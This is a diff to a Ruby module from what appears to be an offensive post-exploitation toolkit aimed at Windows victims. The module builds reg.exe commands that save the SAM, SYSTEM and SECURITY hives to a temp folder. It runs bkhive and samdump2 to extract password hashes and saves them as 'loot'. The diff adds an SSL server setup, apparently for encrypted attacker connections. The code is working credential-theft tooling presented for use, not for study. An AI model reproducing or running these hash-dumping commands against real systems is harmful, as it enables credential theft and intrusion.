@@ -1,5 +1,6 @@
 #!/usr/bin/env ruby
 require 'base64'
+require 'openssl'
 require 'fileutils'
 require 'open3'
 module MainCommands
@@ -52,6 +53,9 @@ module MainCommands
   def reg_folder
     'c:\\windows\\temp\\reg\\'
   end
+  def cert_dir
+    file_root + '/certs/'
+  end
   def save_sam
     "reg.exe save HKLM\\SAM #{reg_folder}sam"
   end
@@ -62,7 +66,7 @@ module MainCommands
     "reg.exe save HKLM\\SECURITY #{reg_folder}sec"
   end
   def victim_path
-    'c:\\windows\\temp\\'
+    'c:\\windows\\temp'
   end
   def temp_path
     'c:\\windows\\temp\\test.txt'
@@ -75,8 +79,8 @@ module MainCommands
     print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /1/
     print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /1/
     if samdump_status.to_s =~ /0/ and bkhive_status.to_s =~ /0/
-      Open3.capture2("#{bkhive_path} #{loot_dir}sys#{x} #{loot_dir}sys_key.txt")
-      sam_dump = Open3.capture2("#{samdump_path} #{loot_dir}sam#{x} #{loot_dir}sys_key.txt")
+      Open3.capture2("#{bkhive_path} #{loot_dir}sys#{x} #{loot_dir}sys_key#{x}.txt")
+      sam_dump = Open3.capture2("#{samdump_path} #{loot_dir}sam#{x} #{loot_dir}sys_key#{x}.txt")
       print_success("Printing Hashes!\n")
       puts sam_dump
       File.open("#{loot_dir}hashes#{x}.txt",'w') {|f| f.write(sam_dump)}
@@ -106,6 +110,14 @@ module MainCommands
   def bin_to_hex(file)
     bin_file = File.open(file, 'rb').read
     bin_file.unpack('H*').first
+  end
+  def ssl_setup(host, port)
+    tcp_server = TCPServer.new(host,port)
+    ctx = OpenSSL::SSL::SSLContext.new
+    ctx.cert = OpenSSL::X509::Certificate.new(File.open("#{cert_dir}server.crt"))
+    ctx.key = OpenSSL::PKey::RSA.new(File.open("#{cert_dir}server.key"))
+    server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
+    return server
   end
 end
 module MsfCommands
